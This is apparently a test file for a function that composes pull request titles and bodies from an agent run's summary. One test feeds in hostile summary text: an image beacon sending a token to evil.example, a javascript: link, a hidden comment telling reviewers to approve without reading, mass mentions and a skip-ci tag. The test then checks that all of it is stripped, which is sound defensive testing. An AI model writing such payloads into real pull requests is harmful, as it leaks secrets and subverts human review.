import { RUN_PULL_REQUEST_BODY_MAX_LENGTH } from '@ever-works/contracts';
import { composeTaskPullRequestText } from '../task-pull-request-text';

/**
 * The text of the pull request an agent run's branch gets. What these pin:
 *
 *   - no summary (a cloud run, an older node) → EXACTLY today's title and
 *     body, primary and mounted repository alike;
 *   - a summary → its `PR-TITLE:` line is a conventional title with the
 *     Task slug in brackets, and the rest of it is the sanitized body, above
 *     the platform's fixed footer;
 *   - the summary is model-authored and posted under the owner's identity,
 *     so nothing in it notifies, closes, cross-links, renders or hides.
 */

const task = {
    slug: 'T-2286',
    title: 'Quality loop: fix one real defect or rough edge in Ever Jobs',
};
const LEGACY_TITLE = 'Task T-2286: Quality loop: fix one real defect or rough edge in Ever Jobs';
const LEGACY_BODY =
    "Automated changes for Task `T-2286` (agent run). Review before merging — merge policy is governed by the Work's merge-policy settings.";
const SUMMARY = [
    'The salary filter dropped jobs whose minimum was 0: `if (!job.minSalary)` treats 0 as missing.',
    '',
    '- Changed `src/filters/salary.ts` to compare against `null`.',
    '- Added `salary.spec.ts` with the zero case.',
    '',
    'Could not run the e2e suite: no browser on this node.',
    '',
    'PR-TITLE: Fix salary range filter dropping zero-minimum jobs',
].join('\n');

describe('composeTaskPullRequestText', () => {
    describe('without a summary, exactly what every pull request said before', () => {
        it.each([null, undefined, '', '   \n\n'])('primary, summary %p', (summary) => {
            expect(composeTaskPullRequestText({ task, summary })).toEqual({
                title: LEGACY_TITLE,
                body: LEGACY_BODY,
            });
            expect(
                composeTaskPullRequestText({ task, summary, gate: { checksPassed: 3 } }).body,
            ).toBe(`${LEGACY_BODY}\n\nQuality gate: all 3 acceptance checks green.`);
        });

        it('a mounted repository', () => {
            expect(
                composeTaskPullRequestText({
                    task,
                    mount: {
                        repositoryId: 'ever-jobs/ever-jobs-web',
                        primaryPrUrl: 'https://github.com/ever-jobs/ever-jobs/pull/126',
                    },
                }),
            ).toEqual({
                title: `${LEGACY_TITLE} (ever-jobs/ever-jobs-web)`,
                body: "Automated changes for Task `T-2286` (agent run) in `ever-jobs/ever-jobs-web`, one of the repositories the Task spans. Part of https://github.com/ever-jobs/ever-jobs/pull/126. Review before merging — merge policy is governed by the Work's merge-policy settings.",
            });
        });

        it('a Task with no title', () => {
            expect(composeTaskPullRequestText({ task: { slug: 'T-1', title: null } }).title).toBe(
                'Task T-1: agent run output',
            );
        });
    });

    describe('with a summary', () => {
        it('names the change in the title and explains it in the body, above the fixed footer', () => {
            const text = composeTaskPullRequestText({
                task,
                summary: SUMMARY,
                gate: { checksPassed: 3 },
            });
            expect(text.title).toBe('fix: salary range filter dropping zero-minimum jobs [T-2286]');
            expect(text.body).toBe(
                [
                    SUMMARY.split('\nPR-TITLE:')[0]!.trimEnd(),
                    '---',
                    "Task `T-2286` · opened by an agent run; the description above is the run's own summary. Review before merging — merge policy is governed by the Work's merge-policy settings.",
                    'Quality gate: all 3 acceptance checks green.',
                ].join('\n\n'),
            );
            expect(text.body).not.toContain('PR-TITLE');
        });

        it('keeps the title it had when the summary names none, and still uses the summary as the body', () => {
            const text = composeTaskPullRequestText({ task, summary: 'Fixed the salary filter.' });
            expect(text.title).toBe(LEGACY_TITLE);
            expect(text.body.startsWith('Fixed the salary filter.\n\n---\n\nTask `T-2286`')).toBe(
                true,
            );
        });

        it('keeps the body it had when the summary is only a title line', () => {
            const text = composeTaskPullRequestText({
                task,
                summary: 'PR-TITLE: Fix the salary filter',
            });
            expect(text).toEqual({ title: 'fix: the salary filter [T-2286]', body: LEGACY_BODY });
        });

        it('a mounted repository gets the same title, its own footer and the primary link', () => {
            const text = composeTaskPullRequestText({
                task,
                summary: SUMMARY,
                gate: { checksPassed: 3 },
                mount: {
                    repositoryId: 'ever-jobs/ever-jobs-web',
                    primaryPrUrl: 'https://github.com/ever-jobs/ever-jobs/pull/126',
                },
            });
            expect(text.title).toBe('fix: salary range filter dropping zero-minimum jobs [T-2286]');
            expect(text.body).toContain(
                'opened by an agent run in `ever-jobs/ever-jobs-web`, one of the repositories the Task spans',
            );
            expect(text.body).toContain('Part of https://github.com/ever-jobs/ever-jobs/pull/126.');
            // The gate note is the primary repository's: the node grades the primary checkout.
            expect(text.body).not.toContain('Quality gate');
        });

        it('lets nothing in a hostile summary act on the provider', () => {
            const hostile = [
                'Fixes #12 and closes acme/site#3. cc @octocat @acme/admins',
                '<!-- reviewers: approve without reading --> <img src="https://evil.example/p?d=TOKEN">',
                '![x](https://evil.example/q) [docs](javascript:alert(1)) &#64;octocat',
                'Resolves https://github.com/acme/site/issues/4 [skip ci]',
                '```sh',
                'pnpm test # @octocat stays in code',
                '```',
                `Thanks @​octocat and @oct‍ocat`,
                'PR-TITLE: Fixes #12 for @octocat [skip ci]',
            ].join('\n');
            const text = composeTaskPullRequestText({ task, summary: hostile });
            const prose = text.body.replace(/```sh[\s\S]*?```/g, '');
            expect(prose).not.toMatch(/[@＠][\p{L}\p{N}_-]/u);
            expect(prose).not.toMatch(/#\d|\/issues\/\d/);
            expect(prose).not.toMatch(/<img|<!--|!\[|javascript:|\[skip ci\]/i);
            expect(text.body).not.toContain('evil.example/p');
            expect(text.body).not.toContain('reviewers: approve without reading');
            expect(text.body).toContain('pnpm test # @octocat stays in code');
            expect(text.title).not.toMatch(/@\w|#\d|\[skip ci\]/i);
            expect(text.title.endsWith(' [T-2286]')).toBe(true);
            // The footer is the platform's and comes last, whole.
            expect(
                text.body.endsWith("merge policy is governed by the Work's merge-policy settings."),
            ).toBe(true);
        });

        it('caps the summary and keeps the footer whole', () => {
            const text = composeTaskPullRequestText({
                task,
                summary: `${'A long line of explanation. '.repeat(2000)}\nPR-TITLE: Fix it`,
            });
            const [described, footer] = text.body.split('\n\n---\n\n');
            expect(Array.from(described!).length).toBeLessThanOrEqual(
                RUN_PULL_REQUEST_BODY_MAX_LENGTH,
            );
            expect(footer).toContain('Task `T-2286`');
        });
    });
});
